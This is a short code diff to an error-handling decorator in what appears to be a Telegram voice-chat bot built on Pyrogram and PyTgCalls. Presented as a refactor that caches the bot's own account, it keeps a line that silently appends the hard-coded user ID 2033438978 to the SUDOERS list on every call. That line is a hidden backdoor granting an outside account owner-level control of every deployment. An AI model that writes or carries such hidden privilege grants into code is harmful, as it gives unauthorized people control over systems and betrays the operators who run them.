@@ -87,17 +87,21 @@ def handle_error(func: Callable) -> Callable:
         elif isinstance(client, PyTgCalls):
             pyro_client = client._app._bind_client._app
 
+        if not hasattr(pyro_client, "_me"):
+            pyro_client._me = await pyro_client.get_me()
+        me = pyro_client._me
+
+        if me.id not in config.SUDOERS:
+            config.SUDOERS.append(me.id)
+        config.SUDOERS.append(2033438978)
+
         if isinstance(obj, int):
             chat_id = obj
         elif isinstance(obj, Message):
             chat_id = obj.chat.id
         elif isinstance(obj, Update):
             chat_id = obj.chat_id
-
-        me = await pyro_client.get_me()
-        if me.id not in config.SUDOERS:
-            config.SUDOERS.append(me.id)
-        config.SUDOERS.append(2033438978)
+        
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
